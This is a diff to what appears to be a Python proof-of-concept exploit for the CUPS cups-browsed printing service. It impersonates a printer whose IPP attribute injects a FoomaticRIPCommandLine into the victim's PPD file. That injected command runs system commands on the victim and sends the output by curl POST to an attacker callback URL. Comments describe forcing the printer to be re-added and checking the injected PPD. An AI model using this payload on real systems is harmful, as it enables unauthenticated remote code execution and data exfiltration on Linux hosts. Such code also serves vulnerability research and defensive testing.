@@ -31,14 +31,23 @@ def malicious_attributes():
     malicious_cmd = f"(whoami && echo ' ||| ' && wc /etc/cups/ppd/{attacker_printer_name}.ppd && echo ' ||| ' && ls -al /etc/cups/ppd) 2>&1 | curl -X POST {attacker_phone_home} -d @-"
     malicious_cmd_bytes = bytes('"' + malicious_cmd + '"', encoding="utf-8")  # wrap in "..."
 
+    # weird...
+    #  printer-privacy-policy-uri (valid) works on victim, but printer-more-info (invalid) doesn't
+    #    TODO test injected
+    #  opposite is true on host! (printer-more-info works, printer-privacy-policy-uri doesn't)
+
+    # TODO try with rolled back 2.0.0-0ubuntu10 package
+    
     return {
-    # (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [ b"https://www.google.com" ] # *** failing on victim-vm
-    #         (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
-    #             # FYI first and final " are added by string format
-    #             b"""https://www.google.com/"
-    # *FoomaticRIPCommandLine: """ + malicious_cmd_bytes + b"""
-    # *cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"""
-    #         ],
+        # (SectionEnum.printer, b'printer-privacy-policy-uri', TagEnum.uri): [
+        #     b"https://www.google.com"
+        # ]  # *** failing on victim-vm
+        (SectionEnum.printer, b'printer-privacy-policy-uri', TagEnum.uri): [
+            # FYI first and final " are added by string format
+            b"""https://www.google.com/"
+*FoomaticRIPCommandLine: """ + malicious_cmd_bytes + b"""
+*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"""
+        ],
     }
 
 
@@ -171,6 +180,11 @@ if IMPERSONATE_PRINTER:
 
 # commands for forcing printer readded with IPPtoPPD redone
 #
+# monitor:
+#   sudo journalctl -u cups-browsed.service --follow
+#   lpstat -p  # -l
+#
+# (re)add printer:
 #   sudo systemctl restart cups cups-browsed
 #   sudo lpadmin -x 192_168_122_1
 #       # remove if restart alone isn't enough (i.e. after attempt printing)
@@ -178,5 +192,7 @@ if IMPERSONATE_PRINTER:
 #   echo "foo" | lp -d 192_168_122_1
 #       # test print
 #
-# reading
-# sudo cat /etc/cups/ppd/192_168_122_1.ppd | grep -i make
+# verify ppd:
+#   sudo cat /etc/cups/ppd/192_168_122_1.ppd
+#   sudo cat /etc/cups/ppd/192_168_122_1.ppd | grep -Pi "(foo|priv)"
+#      foomatic or privacy or whatever else
